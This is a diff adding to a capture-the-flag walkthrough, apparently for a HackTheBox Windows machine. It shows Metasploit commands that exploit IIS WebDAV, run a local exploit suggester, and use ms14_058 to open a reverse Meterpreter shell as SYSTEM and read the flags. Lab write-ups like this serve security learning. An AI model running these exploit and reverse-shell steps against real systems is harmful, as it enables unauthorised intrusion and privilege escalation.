@@ -160,4 +160,84 @@ We can do the same thing with curl too. Once that file is changed to aspx, visit
 When we run whoami there, we see we are "Network Service". Which means, our privileges are very limited. I'll try some other exploit.
 
 
+There is a churrasco exploit that is supposed to work but I could not figure it out. 
 
+After a bunch of tries, I switched to metasploit.
+
+I used the same exploit as Grandpa.
+
+```
+msf5 > 
+msf5 > use exploit/windows/iis/iis_webdav_scstoragepathfromurl
+msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > show options
+
+```
+
+and got a session as NETWORK SERVICE. I migrated to a better process as NETWORK SERVICE, then ran expoit_suggester. 
+
+```
+msf5 post(multi/recon/local_exploit_suggester) > run
+
+[*] 10.10.10.15 - Collecting local exploits for x86/windows...
+[*] 10.10.10.15 - 30 exploit checks are being tried...
+[+] 10.10.10.15 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
+[+] 10.10.10.15 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
+[+] 10.10.10.15 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
+[+] 10.10.10.15 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
+[+] 10.10.10.15 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
+[+] 10.10.10.15 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
+[+] 10.10.10.15 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
+[*] Post module execution completed
+
+```
+
+Tried the first exploit that appears to be vulnerable "ms14_058_track_popup_menu"
+
+```
+msf5 exploit(windows/local/ms14_058_track_popup_menu) > set LHOST tun0
+LHOST => tun0
+msf5 exploit(windows/local/ms14_058_track_popup_menu) > run
+
+[*] Started reverse TCP handler on 10.10.14.6:4444 
+[*] Launching notepad to host the exploit...
+[+] Process 2032 launched.
+[*] Reflectively injecting the exploit DLL into 2032...
+[*] Injecting exploit into 2032...
+[*] Exploit injected. Injecting payload into 2032...
+[*] Payload injected. Executing exploit...
+[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
+[*] Sending stage (176195 bytes) to 10.10.10.15
+[*] Meterpreter session 2 opened (10.10.14.6:4444 -> 10.10.10.15:1032) at 2020-12-26 16:47:59 -0800
+
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+meterpreter > pwd
+C:\WINDOWS\system32
+
+```
+Now we are system, so I can get the flags.
+
+```
+meterpreter > dir
+Listing: C:\Documents and Settings\Lakis\Desktop
+================================================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+100444/r--r--r--  32    fil   2017-04-12 12:19:57 -0700  user.txt
+
+meterpreter > cat user.txt
+```
+and root
+
+```
+meterpreter > dir
+Listing: C:\Documents and Settings\Administrator\Desktop
+========================================================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+100444/r--r--r--  32    fil   2017-04-12 07:28:50 -0700  root.txt
+
+meterpreter > cat root.txt
+```
